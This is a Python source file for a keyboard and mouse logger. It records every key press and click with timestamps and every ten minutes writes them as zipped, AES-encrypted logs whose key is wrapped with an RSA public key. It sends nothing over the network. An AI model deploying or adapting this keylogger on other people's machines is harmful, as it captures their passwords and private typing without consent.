import time
import zipfile
import os
from datetime import datetime
from pynput import keyboard, mouse
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from os import urandom
import io

# Initialize lists to store logs
# timestamps and keys are stored separately for better compression
key_logs = ([], [])  # (timestamps, keys)
mouse_logs = ([], [])  # (timestamps, mouse events)

# Load the public key
with open("public_key.pem", "rb") as key_file:
    public_key = serialization.load_pem_public_key(key_file.read(), backend=default_backend())


def get_compact_datetime():
    return datetime.now().strftime("%Y_%m_%d_%H_%M_%S")


# Function to encrypt data
def encrypt_data(data):
    encrypted = public_key.encrypt(
        data, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    return encrypted


def encrypt_data_with_aes(data, key):
    # Generate a random initialization vector (IV)
    iv = urandom(16)
    # Create an AES cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    # Pad the data to be a multiple of the block size
    padder = sym_padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    # Encrypt the data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv, encrypted_data


# Function to compress and encrypt the logs
def process_and_save_logs():
    global key_logs, mouse_logs

    st = time.time()

    key_logs_timestamps, key_logs_keys = key_logs
    key_logs = ([], [])
    mouse_logs_timestamps, mouse_logs_keys = mouse_logs
    mouse_logs = ([], [])

    # Compress the logs
    timestamp = get_compact_datetime()
    compressed_data = io.BytesIO()
    with zipfile.ZipFile(compressed_data, "w") as zipf:
        zipf.writestr("key_logs.txt", "\n".join(key_logs_keys))
        zipf.writestr("mouse_logs.txt", "\n".join(mouse_logs_keys))
        zipf.writestr("key_logs_timestamps.txt", "\n".join(key_logs_timestamps))
        zipf.writestr("mouse_logs_timestamps.txt", "\n".join(mouse_logs_timestamps))
    compressed_data.seek(0)

    # Generate a random symmetric key for AES
    aes_key = urandom(32)  # AES-256 key

    # Encrypt the compressed data with AES
    iv, encrypted_data = encrypt_data_with_aes(compressed_data.read(), aes_key)

    # Encrypt the AES key with RSA
    encrypted_aes_key = public_key.encrypt(
        aes_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )

    # Save the encrypted AES key and the encrypted data to a file
    folder = __file__.rsplit(os.sep, 1)[0]
    os.makedirs(os.path.join(folder, "logs"), exist_ok=True)
    encrypted_filename = os.path.join(folder, "logs", f"{timestamp}.log")
    with open(encrypted_filename, "wb") as file:
        file.write(encrypted_aes_key)
        file.write(iv)
        file.write(encrypted_data)

    print(f"Saved logs to {encrypted_filename} in {time.time() - st} seconds")


# Function to handle key press events
def on_press(key):
    key_logs[0].append(get_compact_datetime())
    key_logs[1].append(str(key))


# Function to handle mouse click events
def on_click(x, y, button, pressed):
    mouse_logs[0].append(get_compact_datetime())
    mouse_logs[1].append(f"({x},{y}) {button} {pressed}")


def run():
    # Set up listeners
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)

    # Start listeners
    keyboard_listener.start()
    mouse_listener.start()

    # Interval for processing logs (in seconds)
    log_interval = 60 * 10

    assert log_interval > 1

    # Main loop
    try:
        while True:
            time.sleep(log_interval)
            process_and_save_logs()
    except KeyboardInterrupt:
        # Stop listeners on manual interruption
        keyboard_listener.stop()
        mouse_listener.stop()


if __name__ == "__main__":
    run()
